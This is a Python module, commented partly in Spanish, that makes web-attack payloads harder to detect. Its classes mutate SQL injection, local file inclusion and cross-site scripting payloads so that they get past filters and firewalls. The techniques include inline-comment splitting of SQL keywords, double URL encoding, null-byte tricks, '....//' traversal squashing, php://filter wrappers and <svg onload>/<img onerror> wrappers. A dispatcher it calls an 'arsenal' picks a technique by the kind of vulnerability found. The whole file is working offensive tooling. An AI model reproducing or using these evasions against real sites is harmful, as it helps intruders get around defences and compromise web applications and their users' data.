import random
import re
import urllib.parse
from typing import Dict, List, Optional

class BaseMutator:
    def apply(self, payload: str, strategy: str) -> str:
        raise NotImplementedError

class SQLMutator(BaseMutator):
    def apply(self, payload: str, strategy: str) -> str:
        strategies = {
            "HEX_ENCODE": lambda p: "".join([f"\\x{ord(c):02x}" for c in p]),
            "INLINE_COMMENTS": self._inline_comments,
            "CASE_VARIATION": lambda p: "".join([c.upper() if random.random() > 0.5 else c.lower() for c in p]),
            "URL_DOUBLE_ENCODE": lambda p: urllib.parse.quote(urllib.parse.quote(p)),
            "NULL_BYTE": lambda p: p.replace(" ", "%00 ") + "%00",
        }
        return strategies.get(strategy, strategies["INLINE_COMMENTS"])(payload)

    def _inline_comments(self, payload: str) -> str:
        words = payload.split()
        mutated = "/**/".join(words)
        keywords = ["SELECT", "UNION", "WHERE", "FROM", "INSERT", "DELETE", "UPDATE", "INFORMATION_SCHEMA"]
        for kw in keywords:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            mutated = pattern.sub(lambda m: f"{m.group(0)[:3]}/**/{m.group(0)[3:]}", mutated)
        return mutated

class LFIMutator(BaseMutator):
    def apply(self, payload: str, strategy: str) -> str:
        strategies = {
            "DOT_SQUASH": lambda p: p.replace("../", "....//"),
            "NULL_BYTE": lambda p: p + "%00.jpg",
            "PHP_FILTER": lambda p: f"php://filter/convert.base64-encode/resource={p}",
            "UTF_ENCODE": lambda p: urllib.parse.quote(p),
        }
        return strategies.get(strategy, strategies["DOT_SQUASH"])(payload)

class XSSMutator(BaseMutator):
    def apply(self, payload: str, strategy: str) -> str:
        strategies = {
            "SVG_LOAD": lambda p: f"<svg/onload={p}>",
            "IMG_ERROR": lambda p: f"<img src=x onerror={p}>",
            "SQUEEZE": lambda p: p.replace(" ", "/**/"), # Algunas veces funciona en contexto HTML
            "SENSITIVE_CASE": lambda p: p.upper(),
        }
        return strategies.get(strategy, strategies["SVG_LOAD"])(payload)

class ArsenalManager:
    """Dispatcher maestro que elige el mutador según la vulnerabilidad detectada."""
    def __init__(self):
        self.mutators = {
            "SQLI": SQLMutator(),
            "LFI": LFIMutator(),
            "XSS": XSSMutator(),
        }

    def mutate(self, payload: str, vuln_type: str, strategy: str) -> str:
        mutator = self.mutators.get(vuln_type.upper(), self.mutators["SQLI"])
        return mutator.apply(payload, strategy)

# Singleton para facilitar la importación
arsenal = ArsenalManager()
